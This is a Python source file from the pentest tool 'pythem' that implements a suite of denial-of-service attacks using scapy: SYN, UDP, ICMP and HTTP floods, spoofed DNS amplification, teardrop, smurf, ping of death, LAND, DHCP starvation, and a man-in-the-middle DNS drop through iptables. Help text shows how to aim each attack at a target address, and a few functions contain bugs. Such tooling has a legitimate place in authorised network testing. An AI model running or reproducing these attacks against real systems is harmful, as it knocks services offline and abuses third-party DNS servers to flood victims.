#!/usr/bin/python

# Copyright (c) 2016-2018 Angelo Moura
#
# This file is part of the program pythem
#
# pythem is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

from netfilterqueue import NetfilterQueue
from scapy.all import *
import os
import sys
import threading
import requests


class DOSer(object):
    name = "Denial of Service Module."
    desc = "Denial of service attacks here."
    version = "1.3"
    ps = "Need to add POST HTTP DoS attack."

    def __init__(self):
        self.blocks = []
        self.synstop = False
        self.udpstop = False

    def dnsdropstart(self, host):
        os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
        self.host = host
        try:
            print "[+] Man-in-the-middle DNS drop initialized."
            self.t = threading.Thread(name='mitmdrop', target=self.filter)
            self.t.setDaemon(True)
            self.t.start()
        except Exception as e:
            print "[!] Exception caught: {}".format(e)

    def dnsdropstop(self):
        os.system('iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
        self.t.terminate()
        print "[-] Man-in-the-middle DNS drop finalized."

    def callback(self, packet):
        packet.drop()

    def filter(self):
        try:
            self.q = NetfilterQueue()
            self.q.bind(1, self.callback)
            self.q.run()
        except Exception as e:
            print "[!] Exception caught: {}".format(e)

    def udpfloodstart(self, host, tgt, dport):
        self.src = host
        self.tgt = tgt
        self.dport = dport

        try:
            print "[+] UDP flood denial of service initialized on port: {}.".format(dport)
            for i in range(0, 3):
                u = threading.Thread(name='udpflood', target=self.udpflood)
                u.setDaemon(True)
                u.start()
            self.udpflood()
        except Exception as e:
            print "[!] Exception caught: {}".format(e)

    def udpflood(self):
        try:
            IP_layer = IP(src=self.src, dst=self.tgt)
            UDP_layer = UDP(sport=1337, dport=self.dport)
            pkt = IP_layer / UDP_layer
            send(pkt, loop=1, inter=0.0, verbose=False)
            print "[-] UDP flood denial of service finalized."
            exit(0)
        except Exception as e:
            print "[!] Error: {}".format(e)

    def synfloodstart(self, host, tgt, dport):
        self.src = host
        self.tgt = tgt
        self.dport = dport

        try:
            print "[+] SYN flood denial of service initialized."
            for i in range(0, 3):
                s = threading.Thread(name='synflood', target=self.synflood)
                s.setDaemon(True)
                s.start()
            self.synflood()
        except Exception as e:
            print "[!] Exception caught: {}".format(e)

    def synflood(self):
        try:
            IP_layer = IP(src=self.src, dst=self.tgt)
            TCP_layer = TCP(sport=1337, dport=self.dport)
            pkt = IP_layer / TCP_layer
            send(pkt, loop=1, inter=0.0, verbose=False)
            print "[-] SYN flood denial of service finalized."
            exit(0)
        except Exception as e:
            print "[!] Error: {}".format(e)

    def icmpfloodstart(self, host, tgt):
        self.src = host
        self.tgt = tgt

        try:
            print "[+] ICMP flood denial of service initialized."
            for x in range(0, 3):
                i = threading.Thread(name='icmpflood', target=self.icmpflood)
                i.setDaemon(True)
                i.start()
            self.icmpflood()
        except Exception as e:
            print "[!] Exception caught: {}".format(e)

    def icmpflood(self):
        try:
            IP_layer = IP(src=self.src, dst=self.tgt)
            ICMP_layer = ICMP()
            pkt = IP_layer / ICMP_layer
            send(pkt, loop=1, inter=0.0, verbose=False)
            print "[-] ICMP flood denial of service finalized."
            exit(0)
        except Exception as e:
            print "[!] Error: {}".format(e)

    def httpflood(self, tgt):
        i = 0
        # Also will add option to read for a file or auto-generate test-cases for fuzzing purposes
        raw_input = "Only GET method are supported, other methods will be implemented on the next version."
        while True:
            i += 1
            sys.stdout.write("\r" + "[+] Requests: [" + str(i) + "]")
            sys.stdout.flush()
            try:
                requests.get(tgt)
            except KeyboardInterrupt:
                break
                pass
            except Exception as e:
                print "[!] Error: {}".format(e)

    def dnsamplificationstart(self, tgt):
        self.tgt = tgt
        dns = raw_input("[+] DNS Servers to use in amplification attack(separated by commas): ")
        self.dnsservers = []
        for s in dns.split(","):
            self.dnsservers.append(s)

        try:
            print "[+] DNS Amplification denial of service initialized."
            for x in range(0, 3):
                i = threading.Thread(name="dnsamp", target=self.dnsamplification)
                i.setDaemon(True)
                i.start()
            self.dnsamplification()
        except KeyboardInterrupt:
            print "[-] DNS Amplification denial of server finalized."
            exit(0)
        except Exception as e:
            print "[!] Exception caught: {}".format(e)

    def dnsamplification(self):
        try:
            while True:
                for server in self.dnsservers:
                    pkt = IP(dst=server, src=self.tgt) / \
                          UDP(dport=53, sport=RandNum(1024, 65535)) / \
                          DNS(rd=1, qd=DNSQR(qname="www.google.com", qtype="ALL", qclass="IN"))
                    send(pkt, inter=0.0, verbose=False)
        except Exception as e:
            print "[!] Error: {}".format(e)


    def teardrop(self, target):
        # First packet
        try:
            size = input("[+] First fragment packet size: ")
            offset = input("[+] First fragment packet offset: ")
        except Exception as e:
            print "[!] Error: {}".format(e)
            return

        load1 = "\x00" * size
        IP_one = IP(dst=target, flags="MF", proto=17, frag=offset)

        # Second packet
        try:
            size = input("[+] Second fragment packet size: ")
            offset = input("[+] Second fragment packet offset: ")
        except Exception as e:
            print "[!] Error: {}".format(e)
            return

        load2 = "\x00" * size
        IP_two = IP(dst=target, flags=0, proto=17, frag=offset)

        print "[+] Teardrop UDP fragmentation denial of service initialized."
        while True:
            try:
                send(IP_one / load1, verbose=False)
                send(IP_two / load2, verbose=False)
            except KeyboardInterrupt:
                print "[-] Teardrop UDP fragmentation denial of service finalized."
                break

    def icmpsmurfstart(self, tgt):
        self.tgt = tgt
        try:
            multicast = raw_input("[+] IP Address to send echo-requests: ")
            print "[+] ICMP smurf denial of service initialized."
            for x in range(0, 3):
                i2 = threading.Thread(name='icmpsmurf', target=self.icmpsmurf)
                i2.setDaemon(True)
                i2.start
            self.icmpsmurf()
        except:
            print "[!] Error: check the parameters (target)"

    def icmpsmurf(self):
        try:
            IP_layer = IP(src=self.tgt, dst=ip)
            ICMP_layer = ICMP()
            pkt = IP_layer / ICMP_layer
            send(pkt, loop=1, inter=0.0, verbose=False)
            print "[-] ICMP smurf denial of service finalized."
            exit(0)
        except Exception as e:
            print "[!] Error: {}".format(e)

    def pingofdeath(self):
        try:
            pkt = fragment(IP(dst=self.tgt) / ICMP() / ("X" * 60000))
            send(pkt, loop=1, inter=0.0, verbose=False)
            print "[-] Ping Of Death finalized."
            exit(0)
        except Exception as e:
            pass

    def pingofdeathstart(self, target):
        self.tgt = target
        try:
            print "[+] Ping of Death denial of service initialized."
            for x in range(0, 3):
                i = threading.Thread(name='pingofdeath', target=self.pingofdeath)
                i.setDaemon(True)
                i.start()
            self.pingofdeath()
        except Exception as e:
            print "[!] Exception caught: {}".format(e)

    def landstart(self, target, port):
        self.tgt = target
        self.port = port

        try:
            print "[+] LAND attack denial of service initialized."
            for x in range(0, 3):
                i = threading.Thread(name='land', target=self.land)
                i.setDaemon(True)
                i.start()
            self.land()
        except Exception as e:
            print "[!] Exception caught: {}".format(e)

    def land(self):
        try:
            pkt = IP(src=self.tgt, dst=self.tgt) / TCP(sport=self.port)
            send(pkt, loop=1, inter=0.0, verbose=False)
            print "[-] LAND attack finalized."
            exit(0)
        except Exception as e:
            print "[!] Error: {}".format(e)

    def dhcpstarvationstart(self):
        try:
            print "[+] DHCP starvation denial of service initialized."
            self.dhcpstarvation()
        except Exception as e:
            print "[!] Exception caught: {}".format(e)

    def dhcpstarvation(self):
        try:
            conf.checkIPaddr = False
            dhcp_discover = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0",
                                                                               dst="255.255.255.255") / UDP(sport=68,
                                                                                                            dport=67) / BOOTP(
                chaddr=RandString(12, '0123456789abcdef')) / DHCP(options=[("message-type", "discover"), "end"])

            try:
                sendp(dhcp_discover, loop=1, inter=0.0, verbose=False)
            except Exception as e:
                print "[!] Exception caught: {}".format(e)

            print "[-] DHCP starvation denial of service finalized."
            exit(0)
        except Exception as e:
            pass


dos_help = """\n
[Help] Start to perform a choosen denial of service in target.
[Required] Depends
parameters:
  - land
  - dnsdrop
  - synflood
  - udpflood
  - teardrop
  - icmpflood
  - icmpsmurf
  - dhcpstarvation
  - dnsamplification
  - httpflood
  - pingofdeath
example:
pythem> dos icmpsmurf help
\n"""

teardrop_help="""\n
[Help] Start an UDP teardrop fragmentation attack.
[Required] Target and interface
example:
pythem> set interface wlan0
pythem> set target 192.168.0.6
pythem> dos teardrop
\n"""

icmpsmurf_help="""\n
[Help] Start a ICMP smurf attack on target host. send echo-requests with spoofed target address.
[Required] Target and interface
example:
pythem> set target 192.168.1.4
pythem> set interface wlan0
pythem> dos icmpsmurf
\n"""

synflood_help="""\n
[Help] Start a SYN flood attack on target host, default port = 80, set port to change.
[Required] Target and interface
[Optional] port
example:
pythem> set target 192.168.1.4
pythem> set interface wlan0
pythem> dos synflood
\n"""

udpflood_help="""\n
[Help] Start a UDP flood attack on target host, default port = 80, set port to change.
[Required] Target
[Optional] port
example:
pythem> set target 192.168.1.4
pythem> dos synflood
\n"""

dnsdrop_help="""\n
[Help] Start to drop DNS queries that pass through man-in-the-middle traffic.
[Required] ARP spoof started
example:
pythem> dos dnsdrop
\n"""

icmpflood_help="""\n
[Help] Start a ICMP flood attack on target host.
[Required] Target and interface
example:
pythem> set target 10.0.0.1
pythem> set interface wlan0
pythem> dos icmpflood
\n"""

dhcpstarvation_help="""\n
[Help] Start a DHCP starvation attack on network DHCP server. Multiple spoofed mac dhcp discovers.
example:
pythem> dos dhcpstarvation
\n"""

httpflood_help="""\n
[Help] Start a HTTP request flood on a target URL, *Only GET method supported by now.
example:
pythem> set target http://localhost/
pythem> dos httpflood
\n"""

land_help="""\n
[Help] Start a LAND attack on a target.
[Required] Target
[Optional] Port, default = 80
example:
pythem> set target 10.0.0.101
pythem> dos land
\n"""

pingofdeath_help="""\n
[Help] Start a Ping of Death attack on a target.
[Required] Target
example:
pythem> set target 192.168.1.101
pythem> dos pingofdeath
\n"""

dnsamplification_help="""\n
[Help] Start a DNS amplification attack on target address with given DNS servers to amplificate.
example:
pythem> set target 1.2.3.4
pythem> dos dnsamplification
[+] DNS Server to use in amplification attack(separated by commas): 8.8.8.8,8.8.4.4
\n"""